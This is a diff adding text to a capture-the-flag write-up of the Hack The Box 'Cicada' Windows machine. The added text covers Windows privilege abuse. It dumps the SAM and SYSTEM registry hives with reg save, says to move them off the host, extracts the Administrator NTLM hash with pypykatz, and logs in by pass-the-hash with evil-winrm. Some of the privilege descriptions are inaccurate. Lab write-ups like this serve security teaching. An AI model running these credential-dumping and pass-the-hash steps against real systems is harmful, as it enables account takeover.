@@ -4,6 +4,10 @@
 **IP Address:** 10.10.11.35  
 **Difficulty:** Easy
 
+In this write-up, we'll dive into the Cicada HTB box,This is an easy rated box which offers an engaging challenge focused on privilege escalation techniques. From the start, the goal is to explore how users with specific permissions can be exploited for elevated access. After some initial probing, I stumbled upon valid user credentials that led me to a development share filled with interesting files. One standout was a PowerShell script that unexpectedly revealed another user’s credentials.
+
+With the SeBackupPrivilege granted to my user, I was able to back up crucial system files, including the SYSTEM and SAM registries. This step opened the door to extracting hashed credentials for the Administrator account. Using those hashes, I successfully authenticated as the Administrator and took full control of the system. Let’s go through the steps I took to conquer this box and share some insights along the way.
+
 ## Reconnaissance
 ```
 rustscan -a 10.10.11.35 -- -Pn -sC -sV -vvv
@@ -510,8 +514,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ```
 
-Notably, the SeBackupPrivilege and SeRestorePrivilege were enabled, which can often be leveraged for privilege escalation.
-
 SeBackupPrivilege
 
 The SeBackupPrivilege allows a user to bypass file security permissions when backing up files. This means that the user can read files and directories regardless of the permissions set on them. This privilege is typically granted to backup operators and can be exploited for privilege escalation, as it enables access to sensitive files that would otherwise be restricted.
@@ -521,7 +523,87 @@ SeRestorePrivilege
 
 The SeRestorePrivilege allows a user to restore files and directories, even if they do not have explicit permissions to access those files. This privilege can be used to overwrite existing files or create new ones in protected locations, making it useful for restoring system configurations or gaining access to sensitive areas of the file system.
 
+
+SeShutdownPrivilege
+
+    Description: This privilege allows a user to shut down the system.
+    Potential Use: It can be used to perform a system shutdown or restart, which may disrupt services or potentially provide an opportunity for an attacker to regain access after a system reboot if they are able to manipulate startup processes.
+
+SeChangeNotifyPrivilege
+
+    Description: Also known as "Bypass traverse checking," this privilege allows a user to access objects (files, folders, etc.) regardless of the permissions set on those objects, as long as the user has access to the parent folder.
+    Potential Use: This privilege is commonly used to traverse directories even if the user does not have permission to access certain files within them. It can be useful for discovering files or executing certain operations that would otherwise be restricted.
+
+SeIncreaseWorkingSetPrivilege
+
+    Description: This privilege allows a user to increase the working set of a process. The working set is the amount of memory that a process can use without causing it to be swapped out of physical memory.
+    Potential Use: While this privilege is less commonly exploited, it can be used to improve the performance of an application by increasing its memory allocation, potentially allowing it to run more efficiently or evade detection in certain scenarios.
+
 we'll be focusing on SeBackupPriviledge for escalation
+
+### SeBackupPrivilege for Escalation
+
+  Create a Temporary Directory
+
+```
+mkdir C:\temp
+```
+Backup SYSTEM and SAM Files
+
+ SYSTEM File: Contains information about the system configuration and control settings for the operating system. It includes details such as services, drivers, and device settings.
+ SAM File: Stands for Security Account Manager; it stores user account information, including usernames and hashed passwords for local accounts.
+
+```powershell
+
+reg save hklm\system C:\temp\system
+reg save hklm\sam C:\temp\sam
+```
+
+Exfiltrate the Files to Your Own Machine
+
+After successfully backing up the files to the temporary directory, you can use various methods to transfer these files to your local machine. Common methods include using Evil-WinRM with download commands or using SMB shares.
+
+### Privilege Escalation Using Pass-the-Hash
+
+ Extract Hashes with pypykatz
+ Use pypykatz to parse the SAM and SYSTEM registry hives to extract stored credentials.
+ ```
+┌──(mofe㉿mofe)-[~/files/htb/cicada]
+└─$ pypykatz registry --sam sam system
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+Identify the Administrator Hash
+
+The hash for the Administrator account is 2b87e7c93a3e8a0ea4a581937016f341. You will use this hash to authenticate as the Administrator without needing the plaintext password.
+
+```powershell
+┌──(mofe㉿mofe)-[~/files/htb/cicada]
+└─$ evil-winrm -i 10.10.11.35 -u Administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cicada\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+```
+And now we have Administrator priviledges
 
 
 
